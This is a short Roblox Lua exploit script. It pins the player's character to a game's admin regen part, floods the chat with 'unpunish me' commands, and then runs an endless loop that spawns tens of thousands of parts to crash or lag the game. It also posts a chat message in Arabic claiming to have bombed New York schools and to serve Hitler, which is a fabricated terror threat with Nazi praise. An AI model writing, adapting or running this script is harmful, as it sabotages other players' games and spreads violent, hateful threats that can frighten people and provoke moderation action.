-- Script that attaches to the admin reset (regen) part.
local Debris = service.Debris
local New = Instance.new
local p = game:GetService("Players")
local lplr = p.LocalPlayer
local function chat(msg)
    p:Chat(msg)
end
local part = workspace.Terrain._Game.Admin.Regen
local looping = true
local cf = lplr.Character.HumanoidRootPart
chat("قمت بتفخيخ 24 مدرسة في مدينة نيويورك. خدمت هتلر 3 أبريل سأصطدم بتمثال الحرية.")
coroutine.wrap(function()
	while true do
		lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(11)
		part.RotVelocity = Vector3.new(0,0,0)
                part.Velocity = Vector3.new(0,0,0)
		cf.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(lplr.Character.Torso.Size.X/2), 0, 0)
		if not looping then break end
	        task.wait()
	end
end)()
coroutine.wrap(function() while looping do chat('unpunish me '..tostring(math.random(10,1024)) task.wait() end end)()
task.wait(1)
looping = false
	-- funny cleanup
while task.wait(0.1) do
	for i = 1,10000 do
		Debris:AddItem(New("Part",workspace.CurrentCamera),2^4000)
	end
end
